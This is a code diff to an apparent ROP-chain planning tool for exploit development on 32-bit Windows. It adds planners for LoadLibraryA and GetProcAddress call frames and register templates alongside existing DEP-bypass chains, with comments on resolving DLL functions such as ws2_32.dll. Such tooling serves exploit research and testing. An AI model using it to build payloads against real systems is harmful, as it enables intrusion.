@@ -563,6 +563,42 @@ export function planVirtualAllocFrame(params: VirtualAllocFrameParams = {}): Fla
   ], params.badchars);
 }
 
+// ---- LoadLibraryA flat frame ------------------------------------------------
+
+export interface LoadLibraryAFrameParams {
+  loadLibraryA?: number;
+  returnAddress?: number;
+  lpLibFileName?: number;
+  badchars?: number[];
+}
+
+export function planLoadLibraryAFrame(params: LoadLibraryAFrameParams = {}): FlatFramePlan {
+  return planFlatStdcallFrame([
+    { value: params.loadLibraryA, placeholder: "LOADLIBRARYA", comment: "ret target: LoadLibraryA" },
+    { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after LoadLibraryA" },
+    { value: params.lpLibFileName, placeholder: "LP_LIBFILENAME", comment: "lpLibFileName (pointer to DLL name string)" },
+  ], params.badchars);
+}
+
+// ---- GetProcAddress flat frame ----------------------------------------------
+
+export interface GetProcAddressFrameParams {
+  getProcAddress?: number;
+  returnAddress?: number;
+  hModule?: number;
+  lpProcName?: number;
+  badchars?: number[];
+}
+
+export function planGetProcAddressFrame(params: GetProcAddressFrameParams = {}): FlatFramePlan {
+  return planFlatStdcallFrame([
+    { value: params.getProcAddress, placeholder: "GETPROCADDRESS", comment: "ret target: GetProcAddress" },
+    { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after GetProcAddress" },
+    { value: params.hModule, placeholder: "HMODULE", comment: "hModule (from LoadLibraryA return value)" },
+    { value: params.lpProcName, placeholder: "LP_PROCNAME", comment: "lpProcName (pointer to function name string)" },
+  ], params.badchars);
+}
+
 // ---- PUSHAD goal templates (DEP bypass techniques) -------------------------
 //
 // Each template expands a classic DEP-bypass into concrete register-setup
@@ -880,6 +916,85 @@ export function planVirtualAlloc(index: CapabilityIndex, params: VirtualAllocPar
   try {
     return planPushadChain(index, virtualAllocSpecs(params), "VirtualAlloc", "direct", [
       "direct PUSHAD VirtualAlloc uses saved ESP as dwSize; verify this size is acceptable or use a different chain shape.",
+    ], params.badchars ?? [], setupSolver, preferStable);
+  } finally {
+    setStableAddressHint(prevHint);
+  }
+}
+
+// -- LoadLibraryA(lpLibFileName) ----------------------------------------------
+// 1 param: EDI=LoadLibraryA, ESI=return addr, EBP=lpLibFileName.
+// Remaining registers are unused. LoadLibraryA returns HMODULE in EAX.
+
+export interface LoadLibraryAParams {
+  loadLibraryA?: number;
+  returnAddress?: number;
+  lpLibFileName?: number;
+  badchars?: number[];
+}
+
+export type LoadLibraryAPlan = PushadPlan;
+
+function loadLibraryASpecs(params: LoadLibraryAParams): RegisterSpec[] {
+  return [
+    { register: "edi", ...named(params.loadLibraryA, "LOADLIBRARYA"), meaning: "LoadLibraryA (RET dispatches here)" },
+    { register: "esi", ...named(params.returnAddress, "RETURN_ADDR"), meaning: "return address after LoadLibraryA (e.g. GetProcAddress chain)" },
+    { register: "ebp", ...named(params.lpLibFileName, "LP_LIBFILENAME"), meaning: "lpLibFileName (pointer to DLL name string)" },
+    { register: "ebx", value: 0x90909090, meaning: "unused by LoadLibraryA (junk)" },
+    { register: "edx", value: 0x90909090, meaning: "unused by LoadLibraryA (junk)" },
+    { register: "ecx", value: 0x90909090, meaning: "unused by LoadLibraryA (junk)" },
+    { register: "eax", value: 0x90909090, meaning: "unused by LoadLibraryA (junk)" },
+  ];
+}
+
+export function planLoadLibraryA(index: CapabilityIndex, params: LoadLibraryAParams = {}, setupSolver?: RegisterSetupFn, preferStable?: (address: bigint) => boolean): LoadLibraryAPlan {
+  const prevHint = getStableAddressHint();
+  setStableAddressHint(preferStable ?? prevHint);
+  try {
+    return planPushadChain(index, loadLibraryASpecs(params), "LoadLibraryA", "direct", [
+      "LoadLibraryA returns HMODULE in EAX; chain the return address to a GetProcAddress stage to consume it.",
+      "lpLibFileName must point to a null-terminated ASCII DLL name (e.g. \"ws2_32.dll\") already in memory or staged on the stack.",
+    ], params.badchars ?? [], setupSolver, preferStable);
+  } finally {
+    setStableAddressHint(prevHint);
+  }
+}
+
+// -- GetProcAddress(hModule, lpProcName) ---------------------------------------
+// 2 params: EDI=GetProcAddress, ESI=return addr, EBP=hModule,
+// saved ESP=lpProcName (not directly settable). GetProcAddress returns FARPROC
+// in EAX.
+
+export interface GetProcAddressParams {
+  getProcAddress?: number;
+  returnAddress?: number;
+  hModule?: number;
+  lpProcName?: number;
+  badchars?: number[];
+}
+
+export type GetProcAddressPlan = PushadPlan;
+
+function getProcAddressSpecs(params: GetProcAddressParams): RegisterSpec[] {
+  return [
+    { register: "edi", ...named(params.getProcAddress, "GETPROCADDRESS"), meaning: "GetProcAddress (RET dispatches here)" },
+    { register: "esi", ...named(params.returnAddress, "RETURN_ADDR"), meaning: "return address after GetProcAddress (e.g. call eax or jmp eax)" },
+    { register: "ebp", ...named(params.hModule, "HMODULE"), meaning: "hModule (from LoadLibraryA return value)" },
+    { register: "ebx", ...named(params.lpProcName, "LP_PROCNAME"), meaning: "lpProcName (pointer to function name string)" },
+    { register: "edx", value: 0x90909090, meaning: "unused by GetProcAddress (junk)" },
+    { register: "ecx", value: 0x90909090, meaning: "unused by GetProcAddress (junk)" },
+    { register: "eax", value: 0x90909090, meaning: "unused by GetProcAddress (junk)" },
+  ];
+}
+
+export function planGetProcAddress(index: CapabilityIndex, params: GetProcAddressParams = {}, setupSolver?: RegisterSetupFn, preferStable?: (address: bigint) => boolean): GetProcAddressPlan {
+  const prevHint = getStableAddressHint();
+  setStableAddressHint(preferStable ?? prevHint);
+  try {
+    return planPushadChain(index, getProcAddressSpecs(params), "GetProcAddress", "direct", [
+      "GetProcAddress returns FARPROC in EAX; chain to a jmp eax / call eax or another stage to dispatch the resolved function.",
+      "hModule is typically the EAX return value from a preceding LoadLibraryA call — not directly available in a static PUSHAD frame; consider a flat stdcall frame or IAT slot_call for chained resolution.",
+      "lpProcName must point to a null-terminated ASCII function name already in memory or staged on the stack.",
     ], params.badchars ?? [], setupSolver, preferStable);
   } finally {
     setStableAddressHint(prevHint);
